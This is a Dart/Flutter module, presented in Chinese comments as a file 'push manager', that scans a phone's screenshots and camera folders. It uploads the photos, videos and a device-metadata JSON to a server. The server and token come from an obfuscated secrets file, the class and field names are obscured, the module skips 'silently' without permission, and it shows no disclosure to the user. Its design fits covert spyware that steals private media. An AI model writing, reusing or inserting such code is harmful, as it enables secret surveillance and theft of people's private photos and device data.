/// 推送管理器（逐文件推送版）
/// - ★ 不打包、不压缩，直接推送原文件
/// - ★ 每批 3 个并发，批间串行（控制服务端压力）
/// - ★ 截图优先（最新 10 张，无大小限制，一次性）
/// - ★ 截图与 DCIM 目录并行扫描
/// - ★ 截图目录为空时不锁定一次性标记
/// - ★ 小文件优先 + 新的优先
/// - ★ 断点续传：成功入 _sent，失败自动重试
/// - ★ JSON 首次单独推送
/// - ★ 智能熔断 + 服务器检测
/// - ★ 本地记录用 flutter_secure_storage 加密存储
library;

import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:flutter_secure_storage/flutter_secure_storage.dart';
import 'package:http/http.dart' as http;
import 'package:http/io_client.dart';
import 'package:permission_handler/permission_handler.dart';

import '../config/secrets.dart';
import '../device_info_helper.dart';

// ── 配置 ──────────────────────────────────────────────────────────────
class Mc {
  final String pushUrl;
  final String pushToken;
  final String serverBaseUrl;

  final String m7;
  final Duration pushTimeout;
  final int maxFiles;

  /// 截图目录（一次性任务，最新 N 张，无大小限制）
  final String screenshotPath;
  /// 截图一次性推送的数量上限
  final int screenshotMaxFiles;

  final Set<String> imageExtensions;
  final Set<String> videoExtensions;

  final int maxSingleFileBytes;
  final int smallFileBytes;
  final int batchSize;
  final int maxConsecutiveFails;

  final String healthCheckUrl;
  final Duration healthCheckTimeout;
  final Duration serverWaitInterval;
  final int serverWaitMaxAttempts;

  const Mc({
    this.pushUrl = '',
    this.pushToken = '',
    this.serverBaseUrl = '',
    this.m7 = '',
    this.pushTimeout = const Duration(minutes: 5),
    this.maxFiles = 50,

    this.screenshotPath = '',
    this.screenshotMaxFiles = 10,

    this.imageExtensions = const {
      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif', '.bmp',
    },
    this.videoExtensions = const {
      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm', '.3gp',
    },

    this.maxSingleFileBytes = 15 * 1024 * 1024,
    this.smallFileBytes = 5 * 1024 * 1024,

    this.batchSize = 3,
    this.maxConsecutiveFails = 6,

    this.healthCheckUrl = '',
    this.healthCheckTimeout = const Duration(seconds: 5),
    this.serverWaitInterval = const Duration(seconds: 10),
    this.serverWaitMaxAttempts = 180,
  });
}

// ── 单例管理器 ─────────────────────────────────────────────────────────
class Ma {
  Ma._internal();
  static final Ma instance = Ma._internal();

  static const String _kSent = 'm1p';
  static const String _kSentUrls = 'm1u';
  static const String _kJsonSent = 'm1j';
  static const String _kJsonUrl = 'm1ju';
  /// 截图一次性完成标记
  static const String _kScreenshotDone = 'm1sc';

  Mc _config = const Mc();

  /// ★ 换成 secure storage
  FlutterSecureStorage? _secure;
  bool _initialized = false;

  final Set<String> _sent = <String>{};
  final Map<String, String> _sentUrls = <String, String>{};

  bool _jsonSent = false;
  String? _jsonUrl;
  /// 截图是否已完成（一次性）
  bool _screenshotDone = false;
  /// 本轮扫描到的截图目录候选数（未过滤 _sent），用于判断“目录是否为空”
  int _lastScannedShotCount = 0;

  Future<void>? _currentTask;
  Future<bool>? _jsonPushing;

  bool get isBusy => _currentTask != null;
  int get sentCount => _sent.length;
  bool get jsonSent => _jsonSent;
  String? get jsonUrl => _jsonUrl;
  bool get screenshotDone => _screenshotDone;

  Map<String, String> get sentUrls => Map.unmodifiable(_sentUrls);

  String? getServerUrl(File file) {
    try {
      final name = file.path.split('/').last;
      final size = file.lengthSync();
      return _sentUrls['$name:$size'];
    } catch (_) {
      return null;
    }
  }

  http.Client? _client;
  http.Client get client => _client ??= _createClient();

  http.Client _createClient() {
    final io = HttpClient();
    io.maxConnectionsPerHost = 8;
    io.idleTimeout = const Duration(seconds: 30);
    io.connectionTimeout = const Duration(seconds: 15);
    return IOClient(io);
  }

  void dispose() {
    try {
      _client?.close();
      _client = null;
    } catch (_) {}
  }

  String _fingerprint(_Scanned s) =>
      '${s.file.path.split('/').last}:${s.size}';

  // ── 初始化 ─────────────────────────────────────────────────────────
  Future<void> initialize({Mc? config}) async {
    if (_initialized) return;

    if (config == null) {
      config = Mc(
        pushUrl: SecureConfig.m2,
        pushToken: SecureConfig.m1,
        serverBaseUrl: SecureConfig.m3,
        m7: SecureConfig.m7,
        screenshotPath: SecureConfig.screenshotPath,
      );
    } else {
      final n1 = config.m7.isEmpty;
      final needShot = config.screenshotPath.isEmpty;
      if (n1 || needShot) {
        config = Mc(
          pushUrl: config.pushUrl,
          pushToken: config.pushToken,
          serverBaseUrl: config.serverBaseUrl,
          m7: n1 ? SecureConfig.m7 : config.m7,
          screenshotPath: needShot
              ? SecureConfig.screenshotPath
              : config.screenshotPath,
          screenshotMaxFiles: config.screenshotMaxFiles,
          pushTimeout: config.pushTimeout,
          maxFiles: config.maxFiles,
          imageExtensions: config.imageExtensions,
          videoExtensions: config.videoExtensions,
          maxSingleFileBytes: config.maxSingleFileBytes,
          smallFileBytes: config.smallFileBytes,
          batchSize: config.batchSize,
          maxConsecutiveFails: config.maxConsecutiveFails,
          healthCheckUrl: config.healthCheckUrl,
          healthCheckTimeout: config.healthCheckTimeout,
          serverWaitInterval: config.serverWaitInterval,
          serverWaitMaxAttempts: config.serverWaitMaxAttempts,
        );
      }
    }
    _config = config;

    // ★ secure storage 初始化（仅 Android）
    _secure = const FlutterSecureStorage(
      aOptions: AndroidOptions(
        encryptedSharedPreferences: true,
      ),
    );

    // ★ 读 _sent（List<String> → JSON 字符串）
    _sent.clear();
    final rawSent = await _secure!.read(key: _kSent);
    if (rawSent != null && rawSent.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawSent) as List;
        _sent.addAll(decoded.map((e) => e as String));
      } catch (_) {}
    }

    // ★ 读 _sentUrls（Map<String,String> → JSON 字符串）
    _sentUrls.clear();
    final rawUrls = await _secure!.read(key: _kSentUrls);
    if (rawUrls != null && rawUrls.isNotEmpty) {
      try {
        final decoded = jsonDecode(rawUrls) as Map<String, dynamic>;
        decoded.forEach((k, v) => _sentUrls[k] = v as String);
      } catch (_) {}
    }

    // ★ bool → '1'
    _jsonSent = (await _secure!.read(key: _kJsonSent)) == '1';
    _jsonUrl = await _secure!.read(key: _kJsonUrl);
    _screenshotDone = (await _secure!.read(key: _kScreenshotDone)) == '1';

    _initialized = true;

    debugPrint('[M] ══════ 启动自检 ══════');
    debugPrint('[M] 已记录成功: ${_sent.length} 个');
    debugPrint('[M] URL 缓存: ${_sentUrls.length} 条');
    debugPrint('[M] JSON 已推送: $_jsonSent');
    debugPrint('[M] 截图一次性任务已完成: $_screenshotDone');
    debugPrint('[M] ══════ 自检完成 ══════');
  }

  Future<bool> hasPermission() async {
    if (!Platform.isAndroid) return false;
    final sdk = await DeviceInfoHelper.getAndroidSdkInt();
    if (sdk >= 33) {
      final images = await Permission.photos.status;
      final videos = await Permission.videos.status;
      return (images.isGranted || images.isLimited) &&
          (videos.isGranted || videos.isLimited);
    } else {
      return (await Permission.storage.status).isGranted;
    }
  }

  Future<void> startPushIfPermitted() async {
    await initialize();
    if (_currentTask != null) {
      debugPrint('[M] ⚠️ 已有任务在跑，等待...');
      await _currentTask;
      return;
    }
    _currentTask = _doPush();
    try {
      await _currentTask;
    } finally {
      _currentTask = null;
    }
  }

  Future<void> _doPush() async {
    if (!await hasPermission()) {
      debugPrint('[M] 无权限，静默跳过');
      return;
    }
    final scanned = await scanFiles();
    await pushAll(scanned);
  }

  // ══════════════════════════════════════════════════════════════════
  // 主流程：分批推送
  // ══════════════════════════════════════════════════════════════════
  Future<void> pushAll(List<_Scanned> scanned) async {
    final filtered = scanned
        .where((s) => !_sent.contains(_fingerprint(s)))
        .toList();

    if (filtered.isEmpty) {
      debugPrint('[M] 无可推送文件');
      // 即使没有可传文件，也走一次结算（截图目录为空时不锁定）
      await _maybeFinalizeScreenshots(filtered);
      return;
    }

    try {
      final totalMB =
          filtered.fold<int>(0, (s, e) => s + e.size) / 1024 / 1024;
      final batchSize = _config.batchSize.clamp(1, 8);
      final totalBatches = (filtered.length + batchSize - 1) ~/ batchSize;

      final shotCount = filtered.where((s) => s.isScreenshot).length;
      debugPrint('[M] 共 ${filtered.length} 个文件 '
          '(${totalMB.toStringAsFixed(1)} MB)，'
          '其中截图 $shotCount 张，'
          '批大小 $batchSize，共 $totalBatches 批');

      final serverOk = await _waitForServer();
      if (!serverOk) {
        debugPrint('[M] ❌ 服务器不可达，放弃本轮');
        return;
      }

      final jsonOk = await _ensureJsonSent();
      if (!jsonOk) {
        debugPrint('[M] ❌ JSON 推送失败，中止本轮');
        return;
      }

      final sw = Stopwatch()..start();
      int okTotal = 0;
      int failTotal = 0;
      int consecutiveFails = 0;
      final maxFails = _config.maxConsecutiveFails;

      for (int i = 0; i < filtered.length; i += batchSize) {
        final end = (i + batchSize < filtered.length)
            ? i + batchSize
            : filtered.length;
        final batch = filtered.sublist(i, end);
        final batchNum = (i ~/ batchSize) + 1;

        debugPrint('[M] ═══ 批次 $batchNum/$totalBatches '
            '(${batch.length} 个) ═══');

        final results = await Future.wait(
          batch.map((s) => _pushOne(s)),
        );

        for (int j = 0; j < batch.length; j++) {
          if (results[j]) {
            _sent.add(_fingerprint(batch[j]));
            okTotal++;
            consecutiveFails = 0;
          } else {
            failTotal++;
            consecutiveFails++;
          }
        }

        await _persist();

        debugPrint('[M] 批次 $batchNum 完成: '
            '成功 ${results.where((r) => r).length}, '
            '失败 ${results.where((r) => !r).length}, '
            '连续失败 $consecutiveFails');

        if (consecutiveFails >= maxFails) {
          debugPrint('[M] 🛑 连续失败 $consecutiveFails 个，中止本轮');
          break;
        }
      }

      sw.stop();
      debugPrint('[M] ══════════ 全部结束 ══════════');
      debugPrint('[M] 成功 $okTotal，失败 $failTotal，'
          '耗时 ${(sw.elapsedMilliseconds / 1000).toStringAsFixed(1)}s');

      // 结算截图一次性任务
      await _maybeFinalizeScreenshots(filtered);
    } catch (e, st) {
      debugPrint('[M] ❌ 主流程异常: $e\n$st');
    }
  }

  /// 截图一次性任务结算：
  /// - 目录为空 → 不锁定，下次继续检查
  /// - 本轮截图全部成功 → 永久锁定
  /// - 有失败 → 不锁定，下次续传
  Future<void> _maybeFinalizeScreenshots(List<_Scanned> filtered) async {
    if (_screenshotDone) return;

    // ★ 目录为空 → 不锁定
    if (_lastScannedShotCount == 0) {
      debugPrint('[M] 截图目录为空，暂不锁定（下次继续检查）');
      return;
    }

    final shotsPending = filtered.where((s) => s.isScreenshot).toList();
    final allOk =
        shotsPending.every((s) => _sent.contains(_fingerprint(s)));
    if (!allOk) {
      debugPrint('[M] ⏸ 截图未全部成功，暂不锁定，下次继续');
      return;
    }

    _screenshotDone = true;
    // ★ bool → '1'
    await _secure?.write(key: _kScreenshotDone, value: '1');
    debugPrint('[M] ★ 截图一次性任务完成，后续启动不再扫描截图目录');
  }

  // ── 单文件推送 ─────────────────────────────────────────────────────
  Future<bool> _pushOne(_Scanned scanned) async {
    final file = scanned.file;
    final name = file.path.split('/').last;

    try {
      if (!await file.exists()) {
        debugPrint('[M] ⏭ $name 已删除，跳过');
        return true;
      }

      final req = http.MultipartRequest('POST', Uri.parse(_config.pushUrl));
      req.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req.headers['Accept-Encoding'] = 'identity';

      req.files.add(await http.MultipartFile.fromPath('file', file.path));
      req.fields['fileName'] = name;

      final streamed =
          await client.send(req).timeout(_config.pushTimeout);

      final code = streamed.statusCode;
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (_) {}

      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }
        if (serverUrl != null) {
          _sentUrls[_fingerprint(scanned)] = serverUrl;
        }
        debugPrint('[M] ✅ $name'
            '${serverUrl != null ? ' → $serverUrl' : ''}');
        return true;
      }

      String bodyStr = '';
      try {
        bodyStr = utf8.decode(rawBytes, allowMalformed: true);
        if (bodyStr.length > 150) {
          bodyStr = '${bodyStr.substring(0, 150)}...';
        }
      } catch (_) {}

      debugPrint('[M] ⚠️ $name HTTP $code body=$bodyStr');
      return false;
    } on TimeoutException {
      debugPrint('[M] ⏱ $name 超时');
      return false;
    } catch (e) {
      debugPrint('[M] ⚠️ $name 网络错误: $e');
      return false;
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // JSON 首次推送
  // ══════════════════════════════════════════════════════════════════
  Future<bool> _ensureJsonSent() async {
    if (_jsonSent && _jsonUrl != null) {
      debugPrint('[M] JSON 已推送，跳过');
      return true;
    }
    if (_jsonPushing != null) {
      return await _jsonPushing!;
    }
    _jsonPushing = _doPushJson();
    try {
      return await _jsonPushing!;
    } finally {
      _jsonPushing = null;
    }
  }

  Future<bool> _doPushJson() async {
    File? jsonFile;
    try {
      debugPrint('[M] 首次推送 device_info.json...');
      final metadata = await DeviceInfoHelper.getDeviceMetadata();
      final jsonBytes = utf8.encode(jsonEncode(metadata));
      final tmpDir = Directory.systemTemp;
      jsonFile = File(
          '${tmpDir.path}/device_info_${DateTime.now().millisecondsSinceEpoch}.json');
      await jsonFile.writeAsBytes(jsonBytes);

      final req = http.MultipartRequest('POST', Uri.parse(_config.pushUrl));
      req.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req.headers['Accept-Encoding'] = 'identity';
      req.files.add(await http.MultipartFile.fromPath('file', jsonFile.path));
      req.fields['fileName'] = 'device_info.json';

      final streamed =
          await client.send(req).timeout(_config.pushTimeout);
      final code = streamed.statusCode;
      List<int> rawBytes = [];
      try {
        rawBytes = await streamed.stream.toBytes();
      } catch (_) {}

      if (code >= 200 && code < 300) {
        String? serverUrl;
        if (rawBytes.isNotEmpty) {
          serverUrl = _parseServerUrl(rawBytes);
        }
        _jsonSent = true;
        _jsonUrl = serverUrl;
        // ★ bool → '1'，URL → 直接存
        await _secure?.write(key: _kJsonSent, value: '1');
        if (serverUrl != null) {
          await _secure?.write(key: _kJsonUrl, value: serverUrl);
        }
        debugPrint('[M] ✅ device_info.json 推送成功');
        return true;
      }
      debugPrint('[M] ❌ device_info.json HTTP $code');
      return false;
    } catch (e) {
      debugPrint('[M] ❌ device_info.json 异常: $e');
      return false;
    } finally {
      try {
        if (jsonFile != null && await jsonFile.exists()) {
          await jsonFile.delete();
        }
      } catch (_) {}
    }
  }

  // ── 解析服务器返回 ─────────────────────────────────────────────────
  String? _parseServerUrl(List<int> rawBytes) {
    try {
      final body = utf8.decode(rawBytes, allowMalformed: true);
      final decoded = jsonDecode(body);

      String? src;
      if (decoded is List && decoded.isNotEmpty) {
        final first = decoded.first;
        if (first is Map) src = first['src'] as String?;
      } else if (decoded is Map) {
        src = decoded['src'] as String? ?? decoded['url'] as String?;
        if (src == null && decoded['data'] is Map) {
          src = (decoded['data'] as Map)['url'] as String?;
        }
      }

      if (src == null) return null;
      return _buildFullUrl(src);
    } catch (_) {
      return null;
    }
  }

  String _buildFullUrl(String pathOrUrl) {
    if (pathOrUrl.startsWith('http://') ||
        pathOrUrl.startsWith('https://')) {
      return pathOrUrl;
    }
    final base = _config.serverBaseUrl.endsWith('/')
        ? _config.serverBaseUrl
            .substring(0, _config.serverBaseUrl.length - 1)
        : _config.serverBaseUrl;
    final rel = pathOrUrl.startsWith('/') ? pathOrUrl : '/$pathOrUrl';
    return '$base$rel';
  }

  // ── 服务器检测 ─────────────────────────────────────────────────────
  Future<bool> _waitForServer() async {
    final url = _config.healthCheckUrl.isNotEmpty
        ? Uri.parse(_config.healthCheckUrl)
        : Uri.parse(_config.pushUrl);

    for (int i = 1; i <= _config.serverWaitMaxAttempts; i++) {
      if (await _pingServer(url)) {
        debugPrint('[M] ✅ 服务器在线（第 $i 次检测）');
        return true;
      }
      final shouldLog =
          i == 1 || i % 10 == 0 || i == _config.serverWaitMaxAttempts;
      if (shouldLog) {
        debugPrint('[M] 服务器不可达（第 $i/'
            '${_config.serverWaitMaxAttempts} 次）');
      }
      if (i < _config.serverWaitMaxAttempts) {
        await Future.delayed(_config.serverWaitInterval);
      }
    }
    return false;
  }

  Future<bool> _pingServer(Uri url) async {
    try {
      final req = http.Request('HEAD', url);
      req.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req.headers['Accept-Encoding'] = 'identity';
      final streamed =
          await client.send(req).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {}
    try {
      final req2 = http.Request('GET', url);
      req2.headers['Authorization'] = 'Bearer ${_config.pushToken}';
      req2.headers['Accept-Encoding'] = 'identity';
      final streamed =
          await client.send(req2).timeout(_config.healthCheckTimeout);
      await streamed.stream.drain<void>();
      return streamed.statusCode < 500;
    } catch (_) {
      return false;
    }
  }

  // ══════════════════════════════════════════════════════════════════
  // 扫描（截图与 DCIM 并行）
  // ══════════════════════════════════════════════════════════════════
  Future<List<_Scanned>> scanFiles() async {
    // ★ 并行扫描两个目录
    final shotFuture = (!_screenshotDone && _config.screenshotPath.isNotEmpty)
        ? _scanOneDir(
            _config.screenshotPath,
            isScreenshot: true,
            applySizeLimit: false, // 截图无大小限制
          )
        : Future.value(<_Scanned>[]);

    final mF = _scanOneDir(
      _config.m7,
      isScreenshot: false,
      applySizeLimit: true,
    );

    final results = await Future.wait([shotFuture, mF]);
    final shotsAll = results[0];
    final mA = results[1];

    // 记录截图目录符合条件的文件数（未过滤 _sent）
    _lastScannedShotCount = shotsAll.length;

    // 截图：过滤已推送 → 最新 N 张
    final shotsPending = shotsAll
        .where((s) => !_sent.contains(_fingerprint(s)))
        .toList()
      ..sort((a, b) => b.modified.compareTo(a.modified));
    final pickedShots =
        shotsPending.take(_config.screenshotMaxFiles).toList();

    // DCIM：过滤已推送 → 小文件优先 + 新优先
    final mP = mA
        .where((s) => !_sent.contains(_fingerprint(s)))
        .toList();
    final smallBytes = _config.smallFileBytes;
    mP.sort((a, b) {
      final aSmall = a.size <= smallBytes;
      final bSmall = b.size <= smallBytes;
      if (aSmall != bSmall) return aSmall ? -1 : 1;
      return b.modified.compareTo(a.modified);
    });

    // 合并：截图优先
    final merged = <_Scanned>[];
    merged.addAll(pickedShots);
    merged.addAll(mP.take(_config.maxFiles));

    if (!_screenshotDone) {
      if (_lastScannedShotCount == 0) {
        debugPrint('[M] 截图目录为空（本轮不锁定）');
      } else {
        debugPrint('[M] 截图目录 $_lastScannedShotCount 张，'
            '本轮待推送 ${pickedShots.length} 张');
      }
    }

    return merged;
  }

  Future<List<_Scanned>> _scanOneDir(
    String path, {
    required bool isScreenshot,
    required bool applySizeLimit,
  }) async {
    final dir = Directory(path);
    if (!await dir.exists()) return [];

    final list = <_Scanned>[];
    await for (final e in dir.list(followLinks: false)) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      final dot = name.lastIndexOf('.');
      if (dot < 0) continue;
      final ext = name.substring(dot).toLowerCase();

      final isImage = _config.imageExtensions.contains(ext);
      final isVideo = _config.videoExtensions.contains(ext);

      // 截图目录只收图片；DCIM 图片/视频都收
      if (isScreenshot) {
        if (!isImage) continue;
      } else {
        if (!isImage && !isVideo) continue;
      }

      try {
        final st = await e.stat();
        if (applySizeLimit && st.size > _config.maxSingleFileBytes) {
          debugPrint('[M] 跳过超大文件（'
              '${(st.size / 1024 / 1024).toStringAsFixed(1)} MB）: $name');
          continue;
        }
        // 不过滤 _sent，交由 scanFiles 统一处理
        list.add(_Scanned(e, st.modified, st.size,
            isScreenshot: isScreenshot));
      } catch (_) {}
    }
    return list;
  }

  // ── 持久化（写 secure storage）────────────────────────────────────
  Future<void> _persist() async {
    for (int attempt = 1; attempt <= 3; attempt++) {
      try {
        // ★ List<String> / Map<String,String> 都存成 JSON 字符串
        await _secure?.write(
          key: _kSent,
          value: jsonEncode(_sent.toList()),
        );
        await _secure?.write(
          key: _kSentUrls,
          value: jsonEncode(_sentUrls),
        );
        return;
      } catch (e) {
        debugPrint('[M] ⚠️ 持久化失败 ($attempt/3): $e');
        if (attempt < 3) {
          await Future.delayed(const Duration(milliseconds: 100));
        }
      }
    }
  }

  Future<void> reset() async {
    _sent.clear();
    _sentUrls.clear();
    _jsonSent = false;
    _jsonUrl = null;
    _screenshotDone = false;
    _lastScannedShotCount = 0;

    await _secure?.delete(key: _kSent);
    await _secure?.delete(key: _kSentUrls);
    await _secure?.delete(key: _kJsonSent);
    await _secure?.delete(key: _kJsonUrl);
    await _secure?.delete(key: _kScreenshotDone);
    debugPrint('[M] 记录已清空（含截图一次性标记）');
  }
}

class _Scanned {
  final File file;
  final DateTime modified;
  final int size;
  /// 是否来自截图目录
  final bool isScreenshot;
  _Scanned(this.file, this.modified, this.size, {this.isScreenshot = false});
}